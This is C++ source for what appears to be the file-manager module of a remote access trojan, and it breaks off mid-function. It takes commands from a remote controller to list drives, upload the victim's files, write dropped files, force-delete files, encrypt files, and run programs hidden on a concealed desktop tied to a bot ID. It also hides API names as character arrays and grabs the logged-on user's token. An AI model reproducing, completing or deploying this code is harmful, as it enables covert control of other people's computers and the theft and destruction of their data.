// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "FileManager.h"
#include "MasterEncoder.h"
#include <LM.h>
#include <ShlObj.h>
#include <shellapi.h>
#include <Shlwapi.h>
#include <atlimage.h> //BMP2JPEG

FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName)
{
	HMODULE hModule;
	hModule = GetModuleHandleA(lpFileName);
	if (hModule == NULL)
		hModule = LoadLibraryA(lpFileName);
	if (hModule != NULL)
		return GetProcAddress(hModule, lpProcName);
	else
		return NULL;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(ISocketBase* pClient) :CManager(pClient)
{
	const char* sign = "master";
	MasterEncoder::getInstance()->setSignAndKey((char*)sign, (int)strlen(sign), 100);

	memset(g_desktopName, 0, sizeof(g_desktopName));
	GetBotId(g_desktopName);
	g_hDesk = OpenDesktop(g_desktopName, 0, TRUE, GENERIC_ALL);
	if (!g_hDesk)
		g_hDesk = CreateDesktop(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
	SetThreadDesktop(g_hDesk);
	lpSendPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	m_bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &m_bIsWow64);
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	benofrce = false;
	copyfile = NULL;
	m_hWorkThread = NULL;
	bIsStopSearch = FALSE;

	m_hWorkZIPThread = NULL;
	bIsStopZIP = FALSE;
	zippath_t = NULL;

	c_pathname = new char[MAX_PATH * 4];
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	LocalFree(lpSendPacket);
	SAFE_DELETE_AR(c_pathname);
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;

	Trace("CFileManager::OnReceive\r\n");
	PVOID OldValue = NULL;
	BOOL bRevert = FALSE;
	if (m_bIsWow64)
	{
		char AjrFx[] = { 'K','E','R','N','E','L','3','2','.','d','l','l','\0' };
		char xTfkA[] = { 'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0' };
		typedef BOOL(WINAPI* Wow64DisableWow64FsRedirectionT)(PVOID* OldValue);
		Wow64DisableWow64FsRedirectionT pWow64DisableWow64FsRedirection = (Wow64DisableWow64FsRedirectionT)MyGetProcAddressA(AjrFx, xTfkA);
		if (pWow64DisableWow64FsRedirection)
			bRevert = pWow64DisableWow64FsRedirection(&OldValue);
	}

	Trace("%x\r\n",lpBuffer[0]);

	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:			// 获取磁盘列表(文件列表)
		SendFilesList((TCHAR*)(lpBuffer + 1));
		break;
	case COMMAND_DELETE_FILE:			// 被控端删除单个文件
	{
		if (benofrce)
		{
			FnDelPathFile((TCHAR*)(lpBuffer + 1));
		}
		else
		{
			DeleteFile((TCHAR*)(lpBuffer + 1));
		}
		SendToken(TOKEN_DELETE_FINISH);
	}
	break;
	case COMMAND_DELETE_DIRECTORY:		// 被控端删除整个文件夹
		DeleteDirectory((TCHAR*)(lpBuffer + 1));
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// 上传文件, 对于控制端来说是下载文件, 控制端仅创建文件(空文件)
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// 上传数据, 对于控制端来说是下载数据, 控制端将保存数据到之前创建的空文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:			// 被控端创建一个空的文件夹
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:			// 被控端重命名文件夹(文件)
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					// 此处特殊
		StopTransfer(*&lpBuffer[1]);
		break;
	case COMMAND_SET_TRANSFER_MODE:		// 下载文件(对于控制端来说是上传文件)时的传输模式, 包含覆盖继传跳过等
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:				// 下载文件, 对于控制端来说是上传文件, 被控端仅创建文件(空文件)
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:				// 下载数据, 对于控制端来说是上传数据, 被控端将保存数据到之前创建的空文件
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:		// 被控端以可见方式打开指定的文件(目录)
	{
		ShellExecute(NULL, _T("open"), (TCHAR*)(lpBuffer + 2), NULL, NULL, SW_SHOW);
	}
	break;
	case COMMAND_OPEN_FILE_HIDE:		// 被控端以隐藏方式打开指定的文件(目录)
	{
		//ShellExecute(NULL, _T("open"), (TCHAR*)(lpBuffer + 1), NULL, NULL, SW_HIDE);
		TCHAR path[MAX_PATH] = { 0 };
		lstrcat(path, _T("cmd.exe /c start "));
		lstrcat(path, (TCHAR*)(lpBuffer + 2));
		STARTUPINFO startupInfo = { 0 };
		startupInfo.cb = sizeof(startupInfo);
		startupInfo.lpDesktop = g_desktopName;
		PROCESS_INFORMATION processInfo = { 0 };
		CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
	}
	break;
	case COMMAND_COMPRESS_FILE_PARAM:	// 被控端用(WinRAR)压缩或解压指定的文件(目录)
		ExeCompress(lpBuffer + 1);
		break;
	case COMMAND_SEARCH_FILE:
		if (bIsStopSearch == TRUE)
			return;
		SendSearchFilesList((TCHAR*)(lpBuffer + 1));
		break;
	case COMMAND_FILES_SEARCH_STOP:
		StopSearchTheard();
		SendToken(TOKEN_SEARCH_FILE_FINISH);
		break;
	case COMMAND_FILE_GETNETHOOD:
		Sleep(150);
		SendNetHood();
		break;
	case COMMAND_FILE_RECENT:
	{
		TCHAR szPath[MAX_PATH];
		::SHGetSpecialFolderPath(NULL, szPath, CSIDL_RECENT, FALSE);
		int ilen = lstrlen(szPath) * sizeof(TCHAR) + 3;
		BYTE* pBuffer = new BYTE[ilen];
		ZeroMemory(pBuffer, ilen);
		pBuffer[0] = TOKEN_FILE_RECENT;
		memcpy(pBuffer + 1, szPath, lstrlen(szPath) * sizeof(TCHAR));
		Send(pBuffer, ilen);
		SAFE_DELETE_AR(pBuffer);
	}
	break;
	case COMMAND_FILE_INFO:
	{
		TCHAR* outpath = new TCHAR[MAX_PATH];
		ZeroMemory(outpath, sizeof(outpath));
		getLnkFormPath((TCHAR*)(lpBuffer + 1), outpath);
		int ilen = lstrlen(outpath) * sizeof(TCHAR) + 3;
		BYTE* pBuffer = new BYTE[ilen];
		ZeroMemory(pBuffer, ilen);
		pBuffer[0] = TOKEN_FILE_INFO;
		memcpy(pBuffer + 1, outpath, lstrlen(outpath) * sizeof(TCHAR));
		Send(pBuffer, ilen);
		SAFE_DELETE_AR(outpath);
		SAFE_DELETE_AR(pBuffer);
	}
	break;
	case COMMAND_FILE_Encryption:
	{
		encfile((char*)(lpBuffer + 1));
		SendToken(TOKEN_FILE_REFRESH);
	}
	break;
	case COMMAND_FILE_Decrypt:
	{
		decryptfile((char*)(lpBuffer + 1));
		SendToken(TOKEN_FILE_REFRESH);
	}
	break;
	case COMMAND_FILE_CopyFile:
	{
		if (nSize < 2)
			return;
		SAFE_DELETE_AR(copyfile);
		copyfile = (TCHAR*)(new byte[nSize - 1]);
		memcpy(copyfile, (char*)(lpBuffer + 1), nSize - 1);
	}
	break;
	case COMMAND_FILE_PasteFile:
	{
		if (nSize > (MAX_PATH * 2 - 10))
			return;
		if (!copyfile) return;

		TCHAR* copynewfile = new TCHAR[MAX_PATH * 2];
		ZeroMemory(copynewfile, MAX_PATH * 2 * 2);
		memcpy(copynewfile, (char*)(lpBuffer + 1), nSize - 1);


		std::wstring input = copyfile;
		std::wistringstream ss(input);
		std::wstring token;
		int num = 0;
		int pathlen = 0;
		TCHAR* tempath = NULL;
		TCHAR* copynewfile_name = new TCHAR[MAX_PATH * 2];
		while (std::getline(ss, token, _T('|')))
		{
			token += _T('\0');
			tempath = (TCHAR*)token.c_str();
			wstring str = tempath;
			int num = 0;
			size_t fi = str.find_last_of(_T("\\"));
			if (fi == str.npos)
				continue;

			ZeroMemory(copynewfile_name, MAX_PATH * 2 * 2);
			memcpy(copynewfile_name, copynewfile, lstrlen(copynewfile) * 2);
			memcpy(copynewfile_name + lstrlen(copynewfile), tempath + fi + 1, (lstrlen(tempath) - fi) * 2);
			std::wstring TEM = copynewfile_name;
			TEM += _T('\0');
			DWORD dwAttr = GetFileAttributes(tempath);
			if (INVALID_FILE_ATTRIBUTES == dwAttr)
			{

			}
			if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			{
				DWORD dwnewAttr = GetFileAttributes(copynewfile_name);
				if (INVALID_FILE_ATTRIBUTES != dwnewAttr)
				{
					DWORD ti = ::timeGetTime();
					wsprintf(copynewfile_name, _T("%s%d"), copynewfile_name, ti);
					TEM = copynewfile_name;
					TEM += _T('\0');
				}
				SHFILEOPSTRUCT fop = { 0 };
				fop.fFlags = FOF_SILENT | FOF_NOERRORUI | FOF_NOCONFIRMMKDIR | FOF_RENAMEONCOLLISION;
				fop.wFunc = FO_COPY;//选择执行类型，FO_COPY,FO_DELETE,FO_RENAME,FO_MOVE四种
				fop.pFrom = tempath;//如：D:\*.txt
				fop.pTo = TEM.c_str();//D:\test
				SHFileOperation(&fop);
			}
			else
			{
				if (!CopyFile(tempath, copynewfile_name, true))
				{
					DWORD ti = ::timeGetTime();
					wsprintf(copynewfile_name, _T("%s%d"), copynewfile_name, ti);
					CopyFile(tempath, copynewfile_name, false);
				}
			}

		}
		SAFE_DELETE_AR(copynewfile_name);
		SAFE_DELETE_AR(copynewfile);


		SendToken(TOKEN_FILE_REFRESH);
	}
	break;

	case COMMAND_FILE_zip:
	{
		if (bIsStopZIP == TRUE)
			return;
		if (nSize > 1)
		{
			zippath_t = new TCHAR[nSize - 1];
			memcpy(zippath_t, lpBuffer + 1, nSize);
			StartZIP();
		}
	}
	break;
	case COMMAND_FILE_zip_stop:
	{
		StopZIPTheard();
	}
	break;
	case COMMAND_FILE_ENFOCE:
	{
		benofrce = true;
	}
	break;
	case COMMAND_FILE_NO_ENFORCE:
	{
		benofrce = false;
	}
	break;
	case COMMAND_FILE_GETINFO:
	{
		TCHAR* filename = (TCHAR*)(lpBuffer + 1);
		wstring str = filename;
		int num = 0;
		size_t fi = str.find_last_of(_T("."));
		if (fi == str.npos)
			return;
		TCHAR* copynewfile_name = new TCHAR[MAX_PATH * 2];
		memcpy(copynewfile_name, filename + fi + 1, (lstrlen(filename) - fi) * 2);
		SendFileInfo(filename, copynewfile_name);
		SAFE_DELETE_AR(copynewfile_name);
	}
	break;
	case COMMAND_FILE_SEARCHPLUS_LIST:
	{
		SendSearchDate(lpBuffer + 1);
	}
	break;
	default:
		break;
	}

	if (bRevert)
	{
		char VjrFx[] = { 'K','E','R','N','E','L','3','2','.','d','l','l','\0' };
		char xTfkV[] = { 'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0' };
		typedef BOOL(WINAPI* Wow64RevertWow64FsRedirectionT)(PVOID OldValue);
		Wow64RevertWow64FsRedirectionT pWow64RevertWow64FsRedirection = (Wow64RevertWow64FsRedirectionT)MyGetProcAddressA(VjrFx, xTfkV);
		if (pWow64RevertWow64FsRedirection)
			pWow64RevertWow64FsRedirection(OldValue);
	}
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;

	// Make a copy of the string for editing.
	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if (pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		//  If the second character in the path is "\", then this is a UNC
		//  path, and we should skip forward until we reach the 2nd \ in the path.

		if ((*p == TEXT('\\')) && (*(p + 1) == TEXT('\\')))
		{
			p++;            // Skip over the first \ in the name.
			p++;            // Skip over the second \ in the name.

			//  Skip until we hit the first "\" (\\Server\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it.

			if (*p)
			{
				p++;
			}

			//  Skip until we hit the second "\" (\\Server\Share\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it also.

			if (*p)
			{
				p++;
			}

		}
		else if (*(p + 1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
		{
			p++;
			p++;

			// If it exists, skip over the root specifier

			if (*p && (*p == TEXT('\\')))
			{
				p++;
			}
		}

		while (*p)
		{
			if (*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);

				// Nothing exists with this name.  Try to make the directory name and error if unable to.
				if (dwAttributes == 0xffffffff)
				{
					if (!CreateDirectory(pszDirCopy, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						// Something exists with this name, but it's not a directory... Error
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		// SetLastError(GetExceptionCode());
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;
}

BOOL CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	TCHAR	lpSubKey[500];
	HKEY	hKey;
	TCHAR	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	TCHAR* lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));

	TCHAR* lpExt = (TCHAR*)_tcschr(lpFile, _T('.'));
	if (!lpExt)
		return false;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, _T("%s\\shell\\open\\command"), strTemp);

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	TCHAR str175914[] = { _T('\"'),_T('%'),_T('1'),_T('\0') };
	TCHAR str175947[] = { _T('%'),_T('1'),_T('\0') };
	lpstrCat = _tcsstr(strTemp, str175914);
	if (lpstrCat == NULL)
		lpstrCat = _tcsstr(strTemp, str175947);

	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, _T(" "));
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	TCHAR str142919[] = { _T('W'),_T('i'),_T('n'),_T('S'),_T('t'),_T('a'),_T('0'),_T('\\'),_T('D'),_T('e'),_T('f'),_T('a'),_T('u'),_T('l'),_T('t'),_T('\0') };
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str142919;


	return (BOOL)CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	char iOagR[] = { _T('K'),_T('E'),_T('R'),_T('N'),_T('E'),_T('L'),_T('3'),_T('2'),_T('.'),_T('d'),_T('l'),_T('l'),_T('\0') };
	char wSuTs[] = { _T('W'),_T('T'),_T('S'),_T('G'),_T('e'),_T('t'),_T('A'),_T('c'),_T('t'),_T('i'),_T('v'),_T('e'),_T('C'),_T('o'),_T('n'),_T('s'),_T('o'),_T('l'),_T('e'),_T('S'),_T('e'),_T('s'),_T('s'),_T('i'),_T('o'),_T('n'),_T('I'),_T('d'),_T('\0') };
	typedef DWORD(WINAPI* WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId = (WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR, wSuTs);

	char oIksN[] = { _T('W'),_T('T'),_T('S'),_T('A'),_T('P'),_T('I'),_T('3'),_T('2'),_T('.'),_T('d'),_T('l'),_T('l'),_T('\0') };
	char xAsDm[] = { _T('W'),_T('T'),_T('S'),_T('Q'),_T('u'),_T('e'),_T('r'),_T('y'),_T('U'),_T('s'),_T('e'),_T('r'),_T('T'),_T('o'),_T('k'),_T('e'),_T('n'),_T('\0') };
	typedef BOOL(WINAPI* WTSQueryUserTokenT)(ULONG SessionId, PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken = (WTSQueryUserTokenT)MyGetProcAddressA(oIksN, xAsDm);

	char AjrFx[] = { _T('A'),_T('D'),_T('V'),_T('A'),_T('P'),_T('I'),_T('3'),_T('2'),_T('.'),_T('d'),_T('l'),_T('l'),_T('\0') };
	char kbCfr[] = { _T('I'),_T('m'),_T('p'),_T('e'),_T('r'),_T('s'),_T('o'),_T('n'),_T('a'),_T('t'),_T('e'),_T('L'),_T('o'),_T('g'),_T('g'),_T('e'),_T('d'),_T('O'),_T('n'),_T('U'),_T('s'),_T('e'),_T('r'),_T('\0') };
	typedef BOOL(WINAPI* ImpersonateLoggedOnUserT)(HANDLE hToken);
	ImpersonateLoggedOnUserT pImpersonateLoggedOnUser = (ImpersonateLoggedOnUserT)MyGetProcAddressA(AjrFx, kbCfr);

	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && pImpersonateLoggedOnUser)
	{
		DWORD dwConsoleSessionId = pWTSGetActiveConsoleSessionId();
		if (pWTSQueryUserToken(dwConsoleSessionId, &hToken))
		{
			//			if (pImpersonateLoggedOnUser(hToken))
			return hToken;
		}
	}
	return NULL;
}

UINT CFileManager::SendDriveList()
{
	TCHAR	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[2048];
	TCHAR	FileSystem[MAX_PATH];
	TCHAR* pDrive = NULL;
	TCHAR	szUserName[UNLEN + 1];
	DWORD	dwUserLen = UNLEN;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	int	AmntMB = 0; // 总大小
	int		FreeMB = 0; // 剩余空间

	GetUserName(szUserName, &dwUserLen);
	if (_tcscmp(szUserName, _T("SYSTEM")) == 0)
		DriveList[1] = TRUE;
	else
		DriveList[1] = FALSE;

	HANDLE hTokenAcsi = ImpersonateLoggedOnUserWrapper();
	//	SHGetSpecialFolderPath(NULL, (char *)&DriveList[1], CSIDL_DESKTOPDIRECTORY, FALSE);
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hTokenAcsi, SHGFP_TYPE_CURRENT, (TCHAR*)&DriveList[2]);
	//	RevertToSelf();
	CloseHandle(hTokenAcsi);
	DWORD dwOffset = 0;
	for (dwOffset = 1 + 1 + (lstrlen((TCHAR*)&DriveList[2]) + 1) * sizeof(TCHAR); *pDrive != _T('\0'); pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);

		int	nTypeNameLen = (lstrlen(sfi.szTypeName) + 1) * sizeof(TCHAR);
		int	nFileSystemLen = (lstrlen(FileSystem) + 1) * sizeof(TCHAR);

		// 计算磁盘大小
		if (pDrive[0] != _T('A') && pDrive[0] != _T('B') && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{
			AmntMB = (int)(HDAmount / 1024 / 1024);
			FreeMB = (int)(HDFreeSpace / 1024 / 1024);
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = ((BYTE*)(pDrive))[0];
		DriveList[dwOffset + 1] = 0x00;
		DriveList[dwOffset + 2] = GetDriveType(pDrive);
		DriveList[dwOffset + 3] = 0x00;
		// 磁盘空间描述占去了8字节
		::memcpy(DriveList + dwOffset + 4, &AmntMB, sizeof(int));
		::memcpy(DriveList + dwOffset + 8, &FreeMB, sizeof(int));

		// 磁盘卷标名及磁盘类型
		::memcpy(DriveList + dwOffset + 12, sfi.szTypeName, nTypeNameLen);
		::memcpy(DriveList + dwOffset + 12 + nTypeNameLen, FileSystem, nFileSystemLen);

		dwOffset += 12 + nTypeNameLen + nFileSystemLen;
	}



	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CFileManager::SendFilesList(TCHAR* lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	UINT	nRet = 0;
	TCHAR	strPath[MAX_PATH];
	TCHAR* lpszSlash = NULL;
	TCHAR* pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize = 1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;

	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");
	TCHAR str_last[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('*'),_T('.'),_T('*'),_T('\0') };
	wsprintf(strPath, str_last, lpszDirectory, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}

	lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_LIST;

	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE*)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (_tcscmp(pszFileName, _T(".")) == 0 || _tcscmp(pszFileName, _T("..")) == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = (lstrlen(pszFileName) + 1) * sizeof(TCHAR);
		::memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		//*(lpList + dwOffset) = 0;
	//	dwOffset++;

		// 文件大小 8 字节
		::memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		::memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		::memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while (FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];
	TCHAR* lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != _T('\\'))
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");
	TCHAR str18114[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('*'),_T('.'),_T('*'),_T('\0') };
	wsprintf(lpszFilter, str18114, lpszDirectory, lpszSlash);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	TCHAR str18046[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('%'),_T('s'),_T('\0') };
	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
				if (benofrce)
				{
					FnDelPathFile(strFile);
				}
				else
				{
					DeleteFile(strFile);
				}

			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // 关闭查找句柄

	if (!RemoveDirectory(lpszDirectory))
	{
		return false;
	}
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	BOOL	error;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	_tcscpy_s(m_strCurrentProcessFileName, lpszFileName);

	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
	{
		error = FALSE;
		//return FALSE;
	}
	else
	{
		error = TRUE;
	}
	dwSizeLow = GetFileSize(m_hFileSend, &dwSizeHigh);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用
	// 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
	int		nPacketSize = (lstrlen(lpszFileName) + 1) * sizeof(TCHAR) + 9;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE* pFileSize = (FILESIZE*)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	pFileSize->error = error;
	::memcpy(bPacket + 9, lpszFileName, (lstrlen(lpszFileName) + 1) * sizeof(TCHAR));

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

void CFileManager::SendFileData(LPBYTE lpBuffer)
{

	FILESIZE* pFileSize;
	TCHAR* lpFileName;

	pFileSize = (FILESIZE*)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return;
	}

	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long*)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;


	// Token,  大小，偏移，文件名，数据
	lpSendPacket[0] = TOKEN_FILE_DATA;
	::memcpy(lpSendPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(m_hFileSend, lpSendPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		Send(lpSendPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}



	return;
}

// 传送下一个文件
void CFileManager::UploadNext()
{
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	list <wstring>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if (m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
